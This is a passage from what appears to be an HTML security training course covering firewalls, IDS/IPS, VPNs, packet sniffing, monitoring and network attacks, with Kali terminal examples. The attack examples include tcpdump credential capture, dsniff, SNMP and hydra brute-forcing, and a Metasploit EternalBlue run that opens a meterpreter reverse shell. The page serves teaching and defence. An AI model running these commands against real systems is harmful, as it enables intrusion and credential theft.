+          <tr><td>WAF (Web App)</td><td>L7 (HTTP)</td><td>Specifically filters HTTP/HTTPS. Blocks SQLi, XSS, CSRF at HTTP level.</td><td>ModSecurity, AWS WAF, Cloudflare WAF</td><td>Complex rules; bypass via encoding/obfuscation</td></tr>
+          <tr><td>Cloud FW / FWaaS</td><td>L3–L7</td><td>Firewall delivered as service. Scales with cloud workloads.</td><td>AWS Security Groups, Azure NSG, Cloudflare</td><td>Vendor lock-in; latency</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>iptables — Linux Firewall (Kali)</h3>
+      <div class="terminal">
+        <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">IPTABLES FIREWALL RULES — KALI LINUX</div></div>
+        <div class="term-body"><pre><span class="comment"># ── View current rules ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo iptables -L -v -n --line-numbers</span>
+<span class="out">Chain INPUT (policy DROP 0 packets, 0 bytes)
+num  pkts  bytes target  prot  in   out  source        destination
+1       5   320  ACCEPT  all   lo   any  0.0.0.0/0     0.0.0.0/0     (loopback)
+2     142  8520  ACCEPT  all   any  any  0.0.0.0/0     0.0.0.0/0     state RELATED,ESTABLISHED
+3       2   120  ACCEPT  tcp   any  any  0.0.0.0/0     0.0.0.0/0     tcp dpt:22
+4       0     0  DROP    all   any  any  0.0.0.0/0     0.0.0.0/0</span>
+
+<span class="comment"># ── Default deny policy ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo iptables <span class="flag">-P INPUT DROP</span></span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo iptables <span class="flag">-P FORWARD DROP</span></span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo iptables <span class="flag">-P OUTPUT ACCEPT</span></span>
+
+<span class="comment"># ── Allow established connections ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span>
+
+<span class="comment"># ── Allow SSH from admin subnet only ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo iptables -A INPUT -p tcp --dport 22 -s <span class="ip">10.0.1.0/24</span> -j ACCEPT</span>
+
+<span class="comment"># ── Allow HTTPS from anywhere ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT</span>
+
+<span class="comment"># ── Block specific IP ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo iptables -A INPUT -s <span class="ip">185.220.101.45</span> -j DROP</span>
+
+<span class="comment"># ── Rate limit (anti-DDoS) — max 5 SSH attempts per minute ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo iptables -A INPUT -p tcp --dport 22 -m limit --limit 5/min -j ACCEPT</span>
+
+<span class="comment"># ── Log dropped packets ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo iptables -A INPUT -j LOG --log-prefix "DROPPED: " --log-level 4</span>
+
+<span class="comment"># ── Save rules (persist across reboots) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo iptables-save > /etc/iptables/rules.v4</span>
+
+<span class="comment"># ── nftables (modern replacement for iptables) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo nft list ruleset</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo ufw enable</span>   <span class="comment"># UFW — simplified frontend for iptables</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo ufw allow ssh</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo ufw status verbose</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Write iptables rules to: allow port 80 and 443, allow SSH only from 192.168.1.0/24, and drop all other inbound traffic.</li>
+      <li>A NGFW (Palo Alto) can block Facebook even if it runs over port 443. What technology enables this and how does it differ from a stateful firewall?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Firewalls are the cornerstone of network security. Modern NGFW with App-ID and SSL inspection provides L7 visibility that traditional firewalls cannot. Default-deny with explicit allow rules is the correct approach. iptables mastery is essential for Linux security professionals.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T91 & T92 ===== -->
+<div class="sec" id="t91">
+  <div class="sh"><span class="sn">Topics 91–92</span><h2>IDS &amp; IPS</h2><span class="se">🚨</span></div>
+  <div class="sb">
+    <div class="sub"><h3>IDS vs IPS</h3>
+      <div class="cmp">
+        <div class="cp2 c"><h4>🔍 IDS — Intrusion Detection System</h4><ul>
+          <li>Monitors traffic — alerts only, does NOT block</li>
+          <li>Placed out-of-band (copy of traffic via SPAN port)</li>
+          <li>No impact on network performance</li>
+          <li>Risk: alert fatigue — thousands of alerts/day</li>
+          <li>Network IDS (NIDS) or Host IDS (HIDS)</li>
+          <li>Tools: Snort (IDS mode), Zeek, Suricata, OSSEC</li>
+        </ul></div>
+        <div class="cp2 r"><h4>🛡️ IPS — Intrusion Prevention System</h4><ul>
+          <li>Monitors AND blocks malicious traffic inline</li>
+          <li>Placed in-line — all traffic passes through it</li>
+          <li>Can block, drop, reset connections in real-time</li>
+          <li>Risk: false positives block legitimate traffic</li>
+          <li>Network IPS (NIPS) or Host IPS (HIPS)</li>
+          <li>Tools: Snort inline, Suricata, Cisco Firepower</li>
+        </ul></div>
+      </div>
+    </div>
+    <div class="sub"><h3>Detection Methods</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Method</th><th>How It Works</th><th>Pros</th><th>Cons</th></tr></thead>
+        <tbody>
+          <tr><td>Signature-based</td><td>Match traffic against database of known attack patterns</td><td>Fast, accurate for known attacks, low false positives</td><td>Zero-days invisible, must update signatures constantly</td></tr>
+          <tr><td>Anomaly-based</td><td>Build baseline of normal traffic, alert on deviations</td><td>Detects unknown attacks, zero-days</td><td>High false positives until baseline mature, complex tuning</td></tr>
+          <tr><td>Policy-based</td><td>Alert when predefined security policy is violated</td><td>Simple, predictable</td><td>Must manually define every policy, misses novel attacks</td></tr>
+          <tr><td>Reputation-based</td><td>Block known malicious IPs/domains via threat intelligence feeds</td><td>Blocks C2 communications instantly</td><td>Attackers rotate IPs, feeds lag attacker speed</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>Snort &amp; Suricata — Kali</h3>
+      <div class="terminal">
+        <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">SNORT / SURICATA — IDS/IPS ON KALI</div></div>
+        <div class="term-body"><pre><span class="comment"># ── Install Snort ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install snort -y</span>
+
+<span class="comment"># ── Run Snort in IDS mode (alert only) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo snort <span class="flag">-A console -q -c</span> /etc/snort/snort.conf <span class="flag">-i eth0</span></span>
+<span class="out">01/15-10:23:45.123456 [**] [1:1000001:1] Possible port scan [**]
+[Priority: 2] {TCP} 192.168.1.50:49152 -> 192.168.1.100:22</span>
+
+<span class="comment"># ── Snort rule syntax ──</span>
+<span class="comment"># action  proto  src    sport   ->  dst      dport  (options)</span>
+<span class="cg">alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force Attempt"; \
+  threshold: type both, track by_src, count 5, seconds 60; \
+  sid:1000001; rev:1;)</span>
+
+<span class="cg">alert icmp any any -> any any (msg:"ICMP Ping Detected"; itype:8; \
+  sid:1000002; rev:1;)</span>
+
+<span class="cg">alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS \
+  (msg:"SQL Injection Attempt"; content:"UNION SELECT"; nocase; \
+  sid:1000003; rev:1;)</span>
+
+<span class="comment"># ── Suricata (modern, faster, multi-threaded) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install suricata -y</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo suricata <span class="flag">-c</span> /etc/suricata/suricata.yaml <span class="flag">-i eth0</span></span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">tail -f /var/log/suricata/fast.log</span>   <span class="comment"># Live alerts</span>
+
+<span class="comment"># ── Update Suricata rules ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo suricata-update</span>   <span class="comment"># Pulls Emerging Threats rules</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Write a Snort rule to detect HTTP traffic containing the string "passwd" in the URI.</li>
+      <li>Your IDS generates 50,000 alerts per day. 99% are false positives. What process would you use to tune it?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>IDS gives visibility; IPS gives control. Most organisations use both: IDS everywhere for visibility, IPS at critical chokepoints. Snort/Suricata are industry standards — free, open-source, and used by enterprise security teams worldwide. Proper rule tuning is the ongoing challenge.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T93 ===== -->
+<div class="sec" id="t93">
+  <div class="sh"><span class="sn">Topic 93</span><h2>VPN (Virtual Private Network)</h2><span class="se">🔐</span></div>
+  <div class="sb">
+    <div class="sub"><h3>VPN Types</h3>
+      <div class="tw"><table>
+        <thead><tr><th>VPN Type</th><th>Use Case</th><th>Protocol</th><th>Security</th><th>Speed</th></tr></thead>
+        <tbody>
+          <tr><td>Remote Access VPN</td><td>Remote workers connecting to corporate network</td><td>WireGuard, OpenVPN, Cisco AnyConnect (IKEv2)</td><td>Excellent</td><td>Good</td></tr>
+          <tr><td>Site-to-Site VPN</td><td>Connect two office networks permanently</td><td>IPSec (IKEv2), GRE over IPSec</td><td>Excellent</td><td>Excellent</td></tr>
+          <tr><td>SSL VPN</td><td>Clientless browser-based access, specific apps</td><td>TLS 1.3 over HTTPS (port 443)</td><td>Good</td><td>Good</td></tr>
+          <tr><td>Consumer VPN</td><td>Privacy from ISP, bypass geo-restrictions</td><td>WireGuard, OpenVPN</td><td>Medium (trust VPN provider)</td><td>Variable</td></tr>
+          <tr><td>Split Tunnel</td><td>Only corporate traffic through VPN; internet direct</td><td>Any</td><td>Risk: internet traffic unmonitored</td><td>Better</td></tr>
+          <tr><td>Full Tunnel</td><td>All traffic routes through VPN/corporate</td><td>Any</td><td>Better visibility &amp; control</td><td>Slower</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>WireGuard Setup — Kali</h3>
+      <div class="terminal">
+        <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">WIREGUARD VPN SETUP ON KALI</div></div>
+        <div class="term-body"><pre><span class="comment"># ── Install WireGuard ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install wireguard -y</span>
+
+<span class="comment"># ── Generate key pair ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">wg genkey | tee /etc/wireguard/private.key | wg pubkey > /etc/wireguard/public.key</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">cat /etc/wireguard/private.key</span>
+<span class="out">cGFydmVuZGEgd2lyZWd1YXJkIGtleXM=  (base64 Curve25519 private key)</span>
+
+<span class="comment"># ── WireGuard config (/etc/wireguard/wg0.conf) ──</span>
+<span class="cg">[Interface]
+PrivateKey = &lt;client_private_key&gt;
+Address = 10.0.0.2/24
+DNS = 1.1.1.1
+
+[Peer]
+PublicKey = &lt;server_public_key&gt;
+Endpoint = vpn.example.com:51820
+AllowedIPs = 0.0.0.0/0   # Full tunnel (all traffic through VPN)
+PersistentKeepalive = 25</span>
+
+<span class="comment"># ── Start/stop VPN ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo wg-quick up wg0</span>      <span class="comment"># Connect</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo wg-quick down wg0</span>    <span class="comment"># Disconnect</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo wg show</span>              <span class="comment"># Status, handshake time, data transferred</span>
+<span class="out">interface: wg0
+  public key: xTIB...
+  listening port: 51820
+peer: aBcD...
+  endpoint: 203.0.113.5:51820
+  latest handshake: 2 seconds ago
+  transfer: 1.44 GiB received, 640 MiB sent</span>
+
+<span class="comment"># ── OpenVPN (alternative) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo openvpn --config client.ovpn</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo openvpn --config hackthebox.ovpn</span>  <span class="comment"># Connect to HackTheBox / TryHackMe labs</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>What cryptographic algorithms does WireGuard use for key exchange, encryption, and authentication?</li>
+      <li>Your company allows split-tunnel VPN. An employee downloads malware on their home network. Can it now reach corporate servers? What policy change prevents this?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>WireGuard is the modern VPN standard — simpler (4,000 lines vs 400,000 for OpenVPN), faster, and with a smaller attack surface. Every penetration tester should know how to set up and connect to VPNs — it's required for lab environments (HackTheBox, TryHackMe, OSCP).</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T94 ===== -->
+<div class="sgt">📡 Attacks &amp; Interception</div>
+<div class="sec" id="t94">
+  <div class="sh"><span class="sn">Topic 94</span><h2>Packet Sniffing</h2><span class="se">👃</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Definition</h3>
+      <div class="def"><div class="dl">Definition</div>
+        <strong>Packet sniffing</strong> (network sniffing) is the capture and analysis of data packets traversing a network. Legitimate use: network troubleshooting, performance analysis. Malicious use: credential theft, session hijacking, and data interception. Any unencrypted protocol is fully readable to a sniffer.
+      </div>
+    </div>
+    <div class="sub"><h3>Wireshark — GUI Packet Analysis</h3>
+      <div class="terminal">
+        <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">WIRESHARK + TCPDUMP — KALI</div></div>
+        <div class="term-body"><pre><span class="comment"># ── Start Wireshark (GUI) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo wireshark &amp;</span>
+
+<span class="comment"># ── tcpdump (command line — more powerful for scripting) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo tcpdump <span class="flag">-i eth0</span></span>                    <span class="comment"># Capture all traffic on eth0</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo tcpdump <span class="flag">-i eth0 -n -v</span></span>            <span class="comment"># No DNS resolve, verbose</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo tcpdump <span class="flag">-i eth0</span> port 80</span>         <span class="comment"># Only HTTP traffic</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo tcpdump <span class="flag">-i eth0</span> host <span class="ip">192.168.1.100</span></span>  <span class="comment"># Filter by IP</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo tcpdump <span class="flag">-i eth0 -w capture.pcap</span></span>  <span class="comment"># Save to file</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo tcpdump <span class="flag">-r capture.pcap</span></span>          <span class="comment"># Read saved capture</span>
+
+<span class="comment"># ── Capture HTTP credentials (unencrypted!) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo tcpdump <span class="flag">-i eth0 -A -s 0</span> 'tcp port 80 and (tcp[((tcp[12:1] &amp; 0xf0) >> 2):4] = 0x504f5354)'</span>
+<span class="out">POST /login HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+
+<span class="err">username=admin&password=P@ssword123</span>   ← PLAINTEXT CREDENTIALS!</span>
+
+<span class="comment"># ── Wireshark display filters ──</span>
+<span class="cg">http.request.method == "POST"</span>         <span class="comment"># Find POST requests</span>
+<span class="cg">http contains "password"</span>              <span class="comment"># HTTP with "password" in body</span>
+<span class="cg">dns.qry.name contains "evil"</span>          <span class="comment"># DNS queries for suspicious domains</span>
+<span class="cg">tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0</span>  <span class="comment"># SYN packets (port scan detection)</span>
+<span class="cg">ip.addr == 192.168.1.100</span>              <span class="comment"># Traffic to/from specific IP</span>
+<span class="cg">!(arp or dns or icmp)</span>                 <span class="comment"># Exclude noise protocols</span>
+
+<span class="comment"># ── dsniff suite (credential sniffing) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install dsniff</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo dsniff <span class="flag">-i eth0</span></span>   <span class="comment"># Auto-extracts passwords from FTP, Telnet, HTTP, etc.</span></pre></div>
+      </div>
+    </div>
+    <div class="sub"><h3>Promiscuous Mode &amp; Monitor Mode</h3>
+      <div class="cmp">
+        <div class="cp2 c"><h4>🔌 Promiscuous Mode (Wired)</h4><ul>
+          <li>NIC accepts ALL packets, not just its own</li>
+          <li>Normally NIC discards packets not destined for it</li>
+          <li>Required for passive sniffing on wired networks</li>
+          <li>Enable: <code>ip link set eth0 promisc on</code></li>
+          <li>Only captures traffic on same switch/hub segment</li>
+        </ul></div>
+        <div class="cp2 g"><h4>📡 Monitor Mode (WiFi)</h4><ul>
+          <li>Captures ALL WiFi frames in range (not just your network)</li>
+          <li>Used for WiFi auditing, WPA handshake capture</li>
+          <li>Enable: <code>airmon-ng start wlan0</code> → wlan0mon</li>
+          <li>Requires compatible wireless card (Alfa AWUS036ACH)</li>
+          <li>Can capture all network beacons and probe requests</li>
+        </ul></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Run <code>sudo tcpdump -i eth0 -n port 53</code> for 1 minute. What DNS queries does your device make? What does this reveal about your browsing habits?</li>
+      <li>In Wireshark, apply the filter <code>http.request.method == "POST"</code>. What credentials can you see if HTTP (not HTTPS) is used?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Packet sniffing is why HTTPS is non-negotiable. Every plaintext protocol (HTTP, FTP, Telnet, SMTP without STARTTLS) is completely readable by any network observer. Wireshark and tcpdump are indispensable both for defenders (troubleshooting) and attackers (credential capture).</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T95 ===== -->
+<div class="sec" id="t95">
+  <div class="sh"><span class="sn">Topic 95</span><h2>Network Monitoring</h2><span class="se">📊</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Monitoring Tools — Kali &amp; Open Source</h3>
+      <div class="terminal">
+        <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">NETWORK MONITORING COMMANDS — KALI</div></div>
+        <div class="term-body"><pre><span class="comment"># ── Real-time traffic analysis ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo nethogs</span>         <span class="comment"># Bandwidth usage per process (top for network)</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo iftop <span class="flag">-i eth0</span></span>  <span class="comment"># Real-time bandwidth per connection</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">bmon</span>                 <span class="comment"># Interface bandwidth monitor</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nload eth0</span>           <span class="comment"># Inbound/outbound bandwidth graph</span>
+
+<span class="comment"># ── Active connections ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">ss <span class="flag">-tulnp</span></span>           <span class="comment"># All listening ports with process names</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">ss <span class="flag">-antp</span></span>           <span class="comment"># All active TCP connections</span>
+<span class="out">State   Recv-Q Send-Q  Local Address:Port  Peer Address:Port  Process
+LISTEN  0      128     0.0.0.0:22          0.0.0.0:*          sshd
+ESTAB   0      0       192.168.1.5:43122   8.8.8.8:443        chrome</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">netstat <span class="flag">-rn</span></span>         <span class="comment"># Routing table</span>
+
+<span class="comment"># ── Network flow analysis (detect anomalies) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo zeek <span class="flag">-i eth0</span></span>  <span class="comment"># Zeek: full network visibility + scripting</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">cat /usr/local/logs/current/conn.log</span>  <span class="comment"># All connections logged</span>
+
+<span class="comment"># ── Ping sweep and host discovery ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">fping <span class="flag">-ag</span> <span class="ip">192.168.1.0/24</span> 2>/dev/null</span>  <span class="comment"># Fast ping sweep</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="flag">-sn</span> <span class="ip">192.168.1.0/24</span></span>              <span class="comment"># Host discovery (no port scan)</span>
+
+<span class="comment"># ── SNMP network device monitoring ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">snmpwalk <span class="flag">-v2c -c public</span> <span class="ip">192.168.1.1</span></span>  <span class="comment"># Walk SNMP OID tree (public community)</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">onesixtyone <span class="flag">-c /usr/share/doc/onesixtyone/dict.txt</span> <span class="ip">192.168.1.1</span></span>  <span class="comment"># SNMP community brute</span></pre></div>
+      </div>
+    </div>
+    <div class="sub"><h3>Monitoring Tools Reference</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Tool</th><th>Type</th><th>Purpose</th><th>Key Strength</th></tr></thead>
+        <tbody>
+          <tr><td>Wireshark</td><td>Packet capture</td><td>Deep protocol analysis</td><td>Decodes 2000+ protocols, GUI</td></tr>
+          <tr><td>Zeek (Bro)</td><td>Network analysis</td><td>Logs all network events to files</td><td>Scriptable, generates structured logs</td></tr>
+          <tr><td>Nagios</td><td>Service monitor</td><td>Uptime monitoring, alerting</td><td>Check service availability, send alerts</td></tr>
+          <tr><td>Zabbix</td><td>Infrastructure</td><td>Full stack monitoring</td><td>SNMP, JMX, agent-based</td></tr>
+          <tr><td>PRTG</td><td>Network monitor</td><td>Bandwidth, availability, SNMP</td><td>Pre-built sensors, easy setup</td></tr>
+          <tr><td>ntopng</td><td>Flow analysis</td><td>Real-time traffic classification</td><td>L7 protocol identification</td></tr>
+          <tr><td>Grafana + InfluxDB</td><td>Dashboarding</td><td>Visualise all metrics</td><td>Beautiful custom dashboards</td></tr>
+          <tr><td>ELK Stack</td><td>Log analysis</td><td>Centralise and search all logs</td><td>Scalable, powerful search</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Run <code>ss -tulnp</code> on your Linux machine. Identify any unexpected listening ports that could be security risks.</li>
+      <li>What is NetFlow/IPFIX? How does it differ from full packet capture in terms of data collected and storage requirements?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>You cannot defend what you cannot see. Network monitoring provides the visibility that makes security possible. Zeek, combined with a SIEM (ELK/Splunk), creates a full network audit trail. Anomalies in traffic patterns — a device suddenly sending 10GB outbound at 3am — are often the first indicator of compromise.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T96 ===== -->
+<div class="sec" id="t96">
+  <div class="sh"><span class="sn">Topic 96</span><h2>Network Attacks</h2><span class="se">⚔️</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Attack Taxonomy</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Attack</th><th>OSI Layer</th><th>Goal</th><th>Kali Tool</th><th>Defence</th></tr></thead>
+        <tbody>
+          <tr><td>Port Scanning</td><td>L4</td><td>Map open services on target</td><td>nmap, masscan, rustscan</td><td>Firewall default-deny, IDS alerts on scans</td></tr>
+          <tr><td>ARP Spoofing</td><td>L2</td><td>MitM on LAN — intercept traffic</td><td>arpspoof, ettercap</td><td>Dynamic ARP Inspection (DAI), 802.1X</td></tr>
+          <tr><td>DNS Spoofing</td><td>L7 (App)</td><td>Redirect victim to fake server</td><td>dnsspoof, responder</td><td>DNSSEC, DoH, DNS monitoring</td></tr>
+          <tr><td>SYN Flood</td><td>L4</td><td>Exhaust server connection table (DoS)</td><td>hping3, nping</td><td>SYN cookies, rate limiting, IPS</td></tr>
+          <tr><td>VLAN Hopping</td><td>L2</td><td>Access unauthorised VLAN</td><td>yersinia</td><td>Disable DTP, set native VLAN unused</td></tr>
+          <tr><td>MAC Flooding</td><td>L2</td><td>Overflow switch CAM table → sniff all</td><td>macof (dsniff)</td><td>Port security, 802.1X</td></tr>
+          <tr><td>Password Spray</td><td>L7</td><td>Credential attack avoiding lockout</td><td>hydra, medusa, crackmapexec</td><td>MFA, smart lockout, anomaly detection</td></tr>
+          <tr><td>SSL Stripping</td><td>L7</td><td>Downgrade HTTPS to HTTP</td><td>sslstrip, bettercap</td><td>HSTS, HSTS Preload</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>Reconnaissance with Kali</h3>
+      <div class="terminal">
+        <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">NETWORK ATTACK RECON — KALI</div></div>
+        <div class="term-body"><pre><span class="comment"># ── Banner grabbing (find service versions) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nc <span class="flag">-nv</span> <span class="ip">192.168.1.100</span> 80</span>
+<span class="out">Connection to 192.168.1.100 80 port [tcp/http] succeeded!
+GET / HTTP/1.0
+
+HTTP/1.1 200 OK
+Server: Apache/2.4.29 (Ubuntu)   ← Version info for exploit research</span>
+
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">telnet <span class="ip">192.168.1.100</span> 25</span>   <span class="comment"># SMTP banner grab</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">openssl s_client <span class="flag">-connect</span> example.com:443</span>  <span class="comment"># TLS cert + cipher info</span>
+
+<span class="comment"># ── Service vulnerability scanning ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nikto <span class="flag">-h</span> http://<span class="ip">192.168.1.100</span></span>  <span class="comment"># Web server vulnerability scan</span>
+<span class="out">[+] Server: Apache/2.4.29
+[+] /admin/ - Admin panel exposed without auth
+[+] /backup.zip - Backup file accessible
+[+] OSVDB-3268: /etc/passwd - Potential passwd file</span>
+
+<span class="comment"># ── Password attacks (with permission only!) ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">hydra <span class="flag">-l</span> admin <span class="flag">-P</span> /usr/share/wordlists/rockyou.txt <span class="flag">-t 4</span> ssh://<span class="ip">192.168.1.100</span></span>
+<span class="out">[22][ssh] host: 192.168.1.100  login: admin  password: password123</span>
+
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">hydra <span class="flag">-L</span> users.txt <span class="flag">-P</span> /usr/share/wordlists/rockyou.txt http-post-form \
+  "<span class="ip">//192.168.1.100</span>/login:username=^USER^&amp;password=^PASS^:Invalid credentials"</span>
+
+<span class="comment"># ── Metasploit exploitation framework ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">msfconsole</span>
+<span class="out">msf6 &gt;</span> <span class="cmd">search eternalblue</span>
+<span class="out">   Name: exploit/windows/smb/ms17_010_eternalblue</span>
+<span class="out">msf6 &gt;</span> <span class="cmd">use exploit/windows/smb/ms17_010_eternalblue</span>
+<span class="out">msf6 exploit(ms17_010_eternalblue) &gt;</span> <span class="cmd">set RHOSTS <span class="ip">192.168.1.100</span></span>
+<span class="out">msf6 exploit(ms17_010_eternalblue) &gt;</span> <span class="cmd">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span>
+<span class="out">msf6 exploit(ms17_010_eternalblue) &gt;</span> <span class="cmd">run</span>
+<span class="out">[*] Meterpreter session 1 opened (192.168.1.10:4444 → 192.168.1.100:49152)</span>
+<span class="out">meterpreter &gt;</span> <span class="cmd">sysinfo</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Using nmap, scan your own machine (<code>localhost</code>). Identify all open ports and determine if each should be open.</li>
+      <li>Why should Metasploit ONLY be used on systems you own or have written permission to test?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
